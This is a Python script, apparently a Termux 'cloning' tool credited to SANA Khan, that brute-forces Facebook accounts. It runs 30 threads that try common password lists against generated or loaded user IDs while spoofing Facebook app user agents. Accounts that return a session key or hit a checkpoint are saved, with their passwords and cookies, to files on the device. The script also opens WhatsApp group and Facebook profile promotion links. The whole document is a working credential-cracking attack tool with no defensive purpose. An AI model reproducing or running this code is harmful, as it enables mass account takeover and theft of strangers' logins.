# Orignally Written By SANA Khan
...
os.system('xdg-open https://chat.whatsapp.com/KpSthW03CQR0wOim0sKtFX')
...
xxnx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"

folder_path = '/sdcard/SANA'
try:
...
loop=0
logo=("""\033[1;37m
      \033[95;1m.d8888.  .d8b.  d8b   db  .d8b.  
      \033[95;1m88'  YP d8' `8b 888o  88 d8' `8b 
      \033[92;1m`8bo.   88ooo88 88V8o 88 88ooo88 
      \033[92;1m  `Y8b. 88~~~88 88 V8o88 88~~~88 
      \033[95;1mdb   8D 88   88 88  V888 88   88 
      \033[95;1m`8888Y' YP   YP VP   V8P YP   YP                                                                   
\033[96;1m------------------------------------------------""")
...
def Main_SANA():
		clear()
		print(f'\033[93;1m [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [0] Exit')
		linex()
		shm= input('\033[93;1m [+] Select option: ')
		if shm =='1':
			file_crack()
		elif shm =='2':
			r_crack()
			...
			os.system(f'xdg-open https://chat.whatsapp.com/{wp}')
			Main_SANA()
		elif shm =='5':
			os.system('xdg-open https://www.facebook.com/profile.php?id=100053307819237')
			Main_SANA()
		elif shm =='0':
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as SANA:
		clear()
		tl = str(len(fo))
		print(' SANA XE SOHAIL ')
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				SANA.submit(api1,ids,names,passlist)
			else:
				SANA.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as SANA:
		...
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','khan123','malik123','baloch123','kingkhan','khan12345','malik123456','khanbaba','pak123','pak1234','malik1122','khan1122']
			SANA.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m [SANA]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				xxnx ="[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+' [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(111,999))+";FBBV/"+str(random.randint(111111111,999999999))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/MPT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E500H;FBSV/'+fbsv+';nullFBCA/armeabi-v7a:armeabi;]" 
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [SANA-OK] '+uid+' | '+pas)
						#print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'SANA_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'SANA_COOKIES.txt')
						...
						print(f'\r\r\33[1m\33[1;35m [SANA-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'SANA-CP.txt')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [SANA-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'SANA_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
					#print(f'\r\r\33[1m\33[1;35m [himadro-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'SANA-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
